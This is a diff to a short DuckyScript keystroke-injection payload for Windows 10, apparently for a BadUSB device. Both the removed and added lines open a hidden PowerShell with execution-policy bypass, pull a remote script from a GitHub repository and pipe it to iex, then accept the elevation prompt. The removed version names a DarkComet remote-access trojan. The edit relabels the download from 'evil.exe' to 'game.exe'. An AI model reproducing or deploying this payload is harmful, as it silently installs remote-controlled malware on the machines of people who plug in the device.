@@ -1,6 +1,6 @@
 REM Title: 3noc1d1c4
 REM Author: 3noc1d1c4
-REM Description: this script downloads evil.exe to startup/evil.exe and runs evil.exe from the folder. Ps1 uploaded in same folder for ease of modification.
+REM Description: this script downloads game.exe to documents/game.exe and runs game.exe from the folder. Ps1 uploaded in same folder for ease of modification.
 REM Target: Windows 10
 DEFAULT_DELAY 100
 
@@ -19,7 +19,7 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C irm https://github.com/knoxoxen/flipperstuffs/raw/main/download%20and%20run%20darkcommet.ps1 | iex
+STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/knoxoxen/flipperstuffs/refs/heads/main/download%20and%20run%20openpeng.ps1 | iex
 CTRL-SHIFT ENTER 
 DELAY 3000
 ALT y
